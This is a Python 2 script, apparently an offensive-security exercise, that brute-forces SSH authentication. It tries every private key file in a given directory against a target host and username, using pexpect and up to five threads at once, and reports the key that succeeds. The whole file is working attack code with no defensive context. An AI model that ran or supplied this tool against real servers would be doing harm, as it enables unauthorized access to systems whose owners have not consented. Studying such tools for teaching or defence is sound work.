import pexpect
import optparse
import os
from threading import *

#Global variables
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
stop = False
fails = 0

def connect(user, host, keyfile, release):
	global stop
	global fails

	try:
		#Messages from the server
		perm_denied = 'Permission Denied'
		ssh_newkey = "Are you sure you want to continue"
		conn_closed = 'Connection was closed by the remote host'

		opt = ' -o PasswordAuthentication=no' #option to not use password auth
		connStr = 'ssh ' + user + '@' + host + ' -i ' +keyfile+opt #command to make the connection
		child = pexpect.spawn(connStr)
		ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '@','$', '#', ])

		if ret == 2: #indicates new host, need to trust key
			print '[-] Adding host to ~/.ssh/known_hosts'
			child.sendline('yes')
			connect(user, host, keyfile, False)
		elif ret == 3: #indicates connection is closed
			print '[-] Connection closed by remote host'
			fails += 1
		elif ret == 1:
			print '[-] Permission Denied'
		elif ret == 4:
			print '[-] Permissions on key are too open, permission denied'		
		elif ret > 4: #indicates success
			print '[+] Success. ' +str(keyfile)
			stop = True
	finally:
		if release:
			connection_lock.release() #once connection is made, close the connection 

def main():
	parser = optparse.OptionParser('usage%prog -H <hostname> -u <user> -d <directory>')
	parser.add_option('-H', dest='tgtHost', type = "string", help = "Specifiy the host")
	parser.add_option('-u', dest='user', type = "string", help = "Specifiy the username")
	parser.add_option('-d', dest='passDir', type = "string", help = "Specifiy the directory for the passkeys")
	(options, args) = parser.parse_args()
	
	host = options.tgtHost
	user = options.user
	passDir = options.passDir

	if (host == None) | (user == None) | (passDir == None):
		print parser.usage
		exit(0)

	for filename in os.listdir(passDir): #go through all of the files in the specified domain
		if stop:
			print '[*] Exiting: Key found'
			exit(0)
		if fails > 5:
			print '[*] Exiting: Too many failed connections'
			print '[!] Adjust number of simultaneous threads'			
			exit(0)

		connection_lock.acquire()
		fullpath = os.path.join(passDir, filename)
		print '[-] Testing keyfile ' + fullpath

		t = Thread(target = connect, args = (user,host,fullpath,True))
		child = t.start()

if __name__ == '__main__':
	main()

		

